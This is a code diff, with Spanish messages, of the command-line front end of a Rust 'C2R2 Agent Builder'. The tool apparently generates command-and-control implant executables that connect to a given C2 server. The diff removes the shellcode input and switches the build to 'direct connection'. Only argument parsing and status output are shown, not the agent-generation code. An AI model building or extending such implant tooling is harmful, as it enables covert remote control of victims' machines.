@@ -7,11 +7,8 @@ use encrypt::generate_agent;
 
 #[derive(Parser)]
 #[command(name = "c2r2-builder")]
-#[command(about = "C2R2 Agent Builder - Genera agentes encriptados", long_about = None)]
+#[command(about = "C2R2 Agent Builder - Genera agentes para conexión directa", long_about = None)]
 struct Args {
-    /// Archivo de shellcode a encriptar
-    shellcode: String,
-    
     /// Nombre del agente generado (sin extensión .exe)
     #[arg(short, long)]
     name: String,
@@ -24,13 +21,12 @@ struct Args {
 fn main() {
     let args = Args::parse();
 
-    println!("🔧 C2R2 Agent Builder v1.0");
-    println!("📁 Shellcode: {}", args.shellcode);
+    println!("🔧 C2R2 Agent Builder v2.0 - Direct Connection");
     println!("🏷️  Agente: {}", args.name);
     println!("🌐 Servidor C2: {}", args.server);
     println!("{}", "-".repeat(50));
 
-    match generate_agent(&args.shellcode, &args.name, &args.server) {
+    match generate_agent(&args.name, &args.server) {
         Ok(_) => {
             println!("✅ Agente generado exitosamente");
         }
